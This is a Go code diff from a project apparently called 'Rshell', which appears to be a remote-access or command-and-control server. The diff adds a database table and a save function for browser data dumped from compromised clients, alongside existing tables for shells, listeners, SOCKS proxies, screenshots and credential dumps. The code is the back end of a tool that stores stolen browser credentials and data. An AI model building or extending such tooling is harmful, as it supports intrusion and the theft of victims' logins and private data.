@@ -3,6 +3,7 @@ package database
 import (
 	"Rshell/pkg/logger"
 	"crypto/rand"
+	"encoding/json"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -130,6 +131,14 @@ type SensitiveResults struct {
 	Content    string `json:"content"`
 	CreatedAt  int64  `json:"createdAt"`
 }
+type DumpBrowserResults struct {
+	Id          int64  `xorm:"pk autoincr" json:"id"`
+	Uid         string `json:"uid"`
+	BrowserName string `json:"browserName"`
+	Category    string `json:"category"`
+	Content     string `json:"content"`
+	CreatedAt   int64  `json:"createdAt"`
+}
 func generateInitialAdminPassword(length int) (string, error) {
 	if length <= 0 {
 		length = 20
@@ -168,7 +177,7 @@ func ConnectDateBase() {
 	if err != nil {
 		logger.Fatalf("连接sqlite数据库失败: %v", err)
 	}
-	err = Engine.Sync2(new(Users), new(Clients), new(Notes), new(Shell), new(Downloads), new(Listener), new(WebDelivery), new(Socks5), new(Settings), new(Key), new(Plugin), new(Screenshots), new(Credentials), new(CredentialDumps), new(SensitiveResults))
+	err = Engine.Sync2(new(Users), new(Clients), new(Notes), new(Shell), new(Downloads), new(Listener), new(WebDelivery), new(Socks5), new(Settings), new(Key), new(Plugin), new(Screenshots), new(Credentials), new(CredentialDumps), new(SensitiveResults), new(DumpBrowserResults))
 	if err != nil {
 		logger.Fatalf("初始化数据库失败: %v", err)
 	}
@@ -263,6 +272,32 @@ func InsertData(engine *xorm.Engine, table interface{}) error {
 
 	return nil
 }
+func SaveDumpBrowserChunk(uid string, browserName string, category string, content string) {
+	// Try to parse browserName and category from the JSON content
+	if browserName == "" || category == "" {
+		var parsed struct {
+			Browser  string `json:"browser"`
+			Category string `json:"category"`
+		}
+		if err := json.Unmarshal([]byte(content), &parsed); err == nil {
+			if browserName == "" {
+				browserName = parsed.Browser
+			}
+			if category == "" {
+				category = parsed.Category
+			}
+		}
+	}
+
+	Engine.Insert(&DumpBrowserResults{
+		Uid:         uid,
+		BrowserName: browserName,
+		Category:    category,
+		Content:     content,
+		CreatedAt:   time.Now().Unix(),
+	})
+}
+
 func SaveSensitiveChunk(uid string, data string) {
 	Engine.Insert(&SensitiveResults{
 		Uid:       uid,
